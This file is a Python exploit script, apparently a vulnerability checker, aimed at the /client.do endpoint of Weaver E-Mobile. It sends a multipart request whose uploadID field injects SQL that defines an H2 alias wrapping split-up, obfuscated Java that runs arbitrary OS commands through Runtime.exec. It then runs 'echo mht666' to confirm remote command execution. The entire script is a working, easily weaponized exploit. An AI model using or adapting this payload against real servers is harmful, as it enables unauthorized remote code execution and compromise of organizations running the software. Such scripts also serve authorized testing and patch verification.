import requests
import urllib

def verify(url):
    relsult = {
        'name': '泛微E-Mobile-client.do存在命令执行漏洞',
        'vulnerable': False,
        'url': url
    }
    headers = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/115.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
        'Accept-Encoding': 'gzip, deflate',
        'Connection': 'close',
        'Cookie': 'JSESSIONID=abcZRb929ZuHEdfjFEAMy',
        'Upgrade-Insecure-Requests': '1',
        'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundaryTm8YXcJeyKDClbU7',
    }
    data = '''------WebKitFormBoundaryTm8YXcJeyKDClbU7
    Content-Disposition: form-data; name="method"

    getupload
    ------WebKitFormBoundaryTm8YXcJeyKDClbU7
    Content-Disposition: form-data; name="uploadID"

    1';CREATE ALIAS if not exists MzSNqKsZTagmf AS CONCAT('void e(String cmd) throws
    java.la','ng.Exception{','Object curren','tRequest =
    Thre','ad.currentT','hread().getConte','xtClass','Loader().loadC','lass("com.caucho.ser
    ver.dispatch.ServletInvocation").getMet','hod("getContextRequest").inv','oke(null);java
    .la','ng.reflect.Field _responseF =
    currentRequest.getCl','ass().getSuperc','lass().getDeclar','edField("_response");_respo
    nseF.setAcce','ssible(true);Object response =
    _responseF.get(currentRequest);java.la','ng.reflect.Method getWriterM =
    response.getCl','ass().getMethod("getWriter");java.i','o.Writer writer =
    (java.i','o.Writer)getWriterM.inv','oke(response);java.ut','il.Scan','ner scan','ner =
    (new
    java.util.Scann','er(Runt','ime.getRunt','ime().ex','ec(cmd).getInput','Stream())).useD
    elimiter("\\A");writer.write(scan','ner.hasNext()?sca','nner.next():"");}');CALL
    MzSNqKsZTagmf('echo mht666');--
    ------WebKitFormBoundaryTm8YXcJeyKDClbU7--'''
    vurl = urllib.parse.urljoin(url, "/client.do")
    try:
        response = requests.post(vurl, headers=headers, data=data)
        if response.status_code == 200 and 'mht666' in response.text:
            relsult['vulnerable'] = True
            relsult['verify'] = vurl
        return relsult

    except:
        return relsult